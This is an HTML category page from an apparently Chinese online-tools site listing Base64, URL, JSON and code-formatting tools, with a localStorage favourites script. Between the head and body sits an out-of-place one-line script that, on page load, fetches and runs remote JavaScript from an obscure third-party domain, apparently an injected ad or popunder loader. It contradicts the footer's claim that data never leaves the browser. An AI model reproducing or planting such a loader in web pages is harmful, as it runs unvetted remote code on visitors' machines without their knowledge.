<!DOCTYPE html>

<head>
  <meta charset="UTF-8">

</head>
<script>(function(s){s.dataset.zone='10684071',s.src='https://nap5k.com/tag.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
<body>
  <header class="site-header">
    <div class="container">
      <a href="../index.html" class="logo">在线工具集</a>
      <nav class="nav">
        <a href="../index.html">首页</a>
        <a href="image-tools.html">图片工具</a>
        <a href="encode-tools.html" class="active">编解码工具</a>
        <a href="text-tools.html">文本工具</a>
        <a href="time-tools.html">时间与数字</a>
      </nav>
    </div>
  </header>

  <main class="site-main container">
    <a href="../index.html" class="back">← 返回首页</a>
    <h1>编解码与格式化工具</h1>
    <p class="lead">各种编解码和格式化工具，帮助您处理和转换数据。</p>

    <section class="tool-category">
      <h2>编解码工具</h2>
      <ul class="tool-list">
        <li data-tool="base64">
          <a href="../tools/base64.html">
            <strong>Base64 编解码</strong>
            <p class="tool-desc">支持中文与 Emoji</p>
          </a>
          <button class="favorite-btn" data-tool="base64">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
              <path d="M19 21l-7-5-7 5V5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2z"></path>
            </svg>
          </button>
        </li>
        <li data-tool="url-encode">
          <a href="../tools/url-encode.html">
            <strong>URL 编解码</strong>
            <p class="tool-desc">encodeURIComponent / decodeURIComponent</p>
          </a>
          <button class="favorite-btn" data-tool="url-encode">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
              <path d="M19 21l-7-5-7 5V5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2z"></path>
            </svg>
          </button>
        </li>
        <li data-tool="json-format">
          <a href="../tools/json-format.html">
            <strong>JSON 格式化</strong>
            <p class="tool-desc">格式化 / 压缩</p>
          </a>
          <button class="favorite-btn" data-tool="json-format">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
              <path d="M19 21l-7-5-7 5V5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2z"></path>
            </svg>
          </button>
        </li>
        <li data-tool="code-format">
          <a href="../tools/code-format.html">
            <strong>代码格式化</strong>
            <p class="tool-desc">JavaScript、CSS、HTML、XML 代码格式化</p>
          </a>
          <button class="favorite-btn" data-tool="code-format">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
              <path d="M19 21l-7-5-7 5V5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2z"></path>
            </svg>
          </button>
        </li>
      </ul>
    </section>
  </main>

  <footer class="site-footer">
    <div class="container">
      <p>纯前端工具，数据仅在本机处理，不经过服务器。</p>
    </div>
  </footer>

  <script>
    // 收藏功能
    const favoriteBtns = document.querySelectorAll('.favorite-btn');
    
    // 从本地存储加载收藏状态
    function loadFavorites() {
      const favorites = JSON.parse(localStorage.getItem('favorites') || '[]');
      favoriteBtns.forEach(btn => {
        const toolId = btn.dataset.tool;
        if (favorites.includes(toolId)) {
          btn.classList.add('favorited');
        }
      });
    }
    
    // 保存收藏状态到本地存储
    function saveFavorites(favorites) {
      localStorage.setItem('favorites', JSON.stringify(favorites));
    }
    
    // 处理收藏按钮点击
    function handleFavoriteClick(e) {
      const btn = e.target.closest('.favorite-btn');
      if (!btn) return;
      
      const toolId = btn.dataset.tool;
      const favorites = JSON.parse(localStorage.getItem('favorites') || '[]');
      
      if (btn.classList.contains('favorited')) {
        // 取消收藏
        btn.classList.remove('favorited');
        const index = favorites.indexOf(toolId);
        if (index > -1) {
          favorites.splice(index, 1);
        }
      } else {
        // 添加收藏
        btn.classList.add('favorited');
        favorites.push(toolId);
      }
      
      saveFavorites(favorites);
    }
    
    // 绑定收藏按钮点击事件
    favoriteBtns.forEach(btn => {
      btn.addEventListener('click', handleFavoriteClick);
    });
    
    // 初始加载收藏状态
    loadFavorites();
  </script>
</body>
</html>
